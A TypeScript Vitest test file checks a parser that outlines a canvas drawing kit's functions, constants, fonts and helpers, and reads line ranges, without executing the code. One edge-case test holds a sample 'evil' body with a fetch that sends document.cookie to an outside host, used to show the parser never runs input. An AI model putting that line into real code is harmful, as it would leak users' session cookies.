import { describe, it, expect } from "vitest";
import { outlineCode, readSourceRange, OUTLINE_LIMITS, type CodeOutline } from "@/lib/overlays/code-outline";
import { KIT_BODY, KIT_HELPER_NAMES } from "@/__tests__/helpers/fixtures/code-kit-body";

function outlineOf(src: string): CodeOutline {
  const r = outlineCode(src);
  if (!r.ok) throw new Error(`did not parse: ${r.error.message}`);
  return r.outline;
}

/** The 1-based line a text first appears on. */
const lineOfText = (src: string, needle: string) => src.slice(0, src.indexOf(needle)).split("\n").length;

describe("outlineCode — a ~200-line kit", () => {
  const lines = KIT_BODY.split("\n");
  const o = outlineOf(KIT_BODY);

  it("is a real kit: about 200 lines, so the outline has something to save", () => {
    expect(o.totalLines).toBe(lines.length - 1); // the trailing newline is not a line
    expect(o.totalLines).toBeGreaterThan(200);
    expect(o.totalChars).toBe(KIT_BODY.length);
  });

  it("lists every top-level function with its parameters and the file's own line numbers", () => {
    const names = o.functions.map((f) => f.name);
    expect(names).toEqual([...KIT_HELPER_NAMES, "withLabel", "rand", "lerp"].sort((a, b) => names.indexOf(a) - names.indexOf(b)));
    expect(new Set(names)).toEqual(new Set([...KIT_HELPER_NAMES, "withLabel", "rand", "lerp"]));
    const heart = o.functions.find((f) => f.name === "heart")!;
    expect(heart.params).toBe("(ctx, cx, cy, size = 40, fill = PAPER)");
    expect(heart.line).toBe(lineOfText(KIT_BODY, "function heart("));
    // The range really is that function: first line the signature, last line its closing brace.
    expect(lines[heart.line - 1]).toMatch(/^function heart\(/);
    expect(lines[heart.endLine - 1]).toBe("}");
    expect(heart.endLine - heart.line).toBe(25);
    const label = o.functions.find((f) => f.name === "withLabel")!;
    expect(label.async).toBe(true);
    // An arrow bound to a const is a function, said so.
    expect(o.functions.find((f) => f.name === "lerp")).toMatchObject({ params: "(a, b, t)", via: "const" });
  });

  it("lists the consts with their short literal values, and a destructuring as one entry", () => {
    const by = (n: string) => o.constants.find((c) => c.name === n)!;
    expect(by("INK")).toMatchObject({ kind: "const", value: '"#1b1b3a"', line: lineOfText(KIT_BODY, "const INK") });
    expect(by("PAPER").value).toBe('"#f4e8d0"');
    expect(by("PALETTE").value).toBe('["#ff5d8f", "#ffb703", "#3a86ff", "#06d6a0"]');
    expect(by("SIZES").value).toBe("{ title: 96, body: 40, caption: 28 }");
    expect(by("MARGIN").value).toBe("64");
    expect(by("GRAIN").value).toBe("0.35");
    expect(by("seed")).toMatchObject({ kind: "let", value: "7" });
    // Not a literal: said so, with what it is, and no invented value.
    expect(by("enter")).toMatchObject({ init: "call" });
    expect(by("enter").value).toBeUndefined();
    const destructured = o.constants.find((c) => c.from === "context")!;
    expect(destructured.name).toBe("{ ctx, width, height, frame, fps, time }");
  });

  it("finds the fonts: a concatenated ctx.font shorthand, and a const-held one used through its name", () => {
    expect(o.fonts).toEqual(["Inter", "Fraunces"]);
  });

  it("lists the documented helpers the body uses, and not the ones it declares or never touches", () => {
    expect(o.helpersUsed).toEqual(["drawRoundedRect", "easeOutCubic", "interpolate"]);
  });

  it("is small: the outline of the kit is a fraction of the kit", () => {
    const bytes = JSON.stringify(o).length;
    expect(bytes).toBeLessThan(KIT_BODY.length / 3);
  });
});

describe("outlineCode — edges", () => {
  it("never runs the body: a body that would throw, loop or reach out is only parsed", () => {
    const evil = `
      while (true) {}
      fetch("https://example.com/leak?" + document.cookie);
      throw new Error("boom");
      function sneaky() {}
      const A = 1;
    `;
    const o = outlineOf(evil);
    expect(o.functions.map((f) => f.name)).toEqual(["sneaky"]);
    expect(o.constants.map((c) => c.name)).toEqual(["A"]);
  });

  it("accepts a top-level return, as a function body may have", () => {
    expect(outlineOf("const a = 1;\nif (a) return;\nfunction f(){}").functions).toHaveLength(1);
  });

  it("a body that does not parse says where, with the file's own line and no acorn suffix", () => {
    const r = outlineCode("const a = 1;\nfunction broken( {\n");
    expect(r.ok).toBe(false);
    if (!r.ok) {
      // `{` opens a destructuring parameter that never closes: acorn trips at EOF, line 3.
      expect(r.error.line).toBe(3);
      expect(r.error.message).not.toMatch(/\(\d+:\d+\)/);
      expect(r.totalLines).toBe(2);
    }
  });

  it("an empty body is an empty outline, not an error", () => {
    const o = outlineOf("");
    expect(o).toMatchObject({ totalLines: 0, totalChars: 0, functions: [], constants: [], fonts: [], helpersUsed: [] });
  });

  it("a property named like a helper is not a use of it; a local function of that name is not either", () => {
    const o = outlineOf("const o = { interpolate: 1 };\no.spring;\nfunction easeIn() {}\neaseIn();");
    expect(o.helpersUsed).toEqual([]);
  });

  it("long literal values are summarised, not copied", () => {
    const big = `const TABLE = [${Array.from({ length: 60 }, (_, i) => i).join(", ")}];\nconst PAL = { ${Array.from({ length: 30 }, (_, i) => `k${i}: "#${i}${i}${i}"`).join(", ")} };`;
    const o = outlineOf(big);
    expect(o.constants[0]!.value).toBe("[60 items]");
    expect(o.constants[1]!.value).toMatch(/^\{ k0, k1, k2, k3, k4, k5, k6, k7, … 30 keys \}$/);
  });

  it("caps its lists, and says how many it dropped", () => {
    const many = Array.from({ length: OUTLINE_LIMITS.functions + 5 }, (_, i) => `function f${i}(){}`).join("\n");
    const o = outlineOf(many);
    expect(o.functions).toHaveLength(OUTLINE_LIMITS.functions);
    expect(o.truncated).toEqual({ functions: 5 });
  });

  it("finds fonts in a template literal and in a fontFamily field", () => {
    const o = outlineOf("const s = 40;\nctx.font = `700 ${s}px \"DM Serif Display\", serif`;\nconst style = { fontFamily: 'Inter, sans-serif' };");
    expect(o.fonts).toEqual(["DM Serif Display", "Inter"]);
  });

  it("survives a deeply nested expression", () => {
    const deep = `const x = ${"(".repeat(2000)}1${")".repeat(2000)};`;
    const r = outlineCode(deep);
    // Either outcome is fine — the point is that it returns instead of overflowing the stack.
    expect(typeof r.ok).toBe("boolean");
  });
});

describe("readSourceRange", () => {
  const src = Array.from({ length: 1000 }, (_, i) => `line ${i + 1}`).join("\n") + "\n";

  it("returns exactly the lines asked for, 1-based and inclusive", () => {
    const r = readSourceRange(src, 3, 5);
    expect(r).toEqual({ from: 3, to: 5, text: "line 3\nline 4\nline 5" });
  });

  it("stops at the end of the file and says it", () => {
    const r = readSourceRange(src, 998, 2000);
    expect(r).toMatchObject({ from: 998, to: 1000, text: "line 998\nline 999\nline 1000", clamped: { askedTo: 2000, reason: "end-of-file" } });
  });

  it("is a window, not a copy of the file: at most 300 lines", () => {
    const r = readSourceRange(src, 1, 900);
    expect("error" in r).toBe(false);
    if (!("error" in r)) {
      expect(r.to).toBe(OUTLINE_LIMITS.sourceLines);
      expect(r.text.split("\n")).toHaveLength(OUTLINE_LIMITS.sourceLines);
      expect(r.clamped).toEqual({ askedTo: 900, reason: "lines" });
    }
  });

  it("caps characters at a line boundary", () => {
    const wide = Array.from({ length: 200 }, (_, i) => `${i}:${"x".repeat(500)}`).join("\n");
    const r = readSourceRange(wide, 1, 200);
    expect("error" in r).toBe(false);
    if (!("error" in r)) {
      expect(r.text.length).toBeLessThanOrEqual(OUTLINE_LIMITS.sourceChars);
      expect(r.clamped?.reason).toBe("chars");
      expect(r.text.split("\n")).toHaveLength(r.to - r.from + 1);
      expect(r.text.endsWith("x")).toBe(true);
    }
  });

  it("refuses a backwards range and one past the end", () => {
    expect(readSourceRange(src, 5, 3)).toHaveProperty("error");
    expect(readSourceRange(src, 1001, 1002)).toMatchObject({ error: expect.stringContaining("1000 lines") });
  });
});
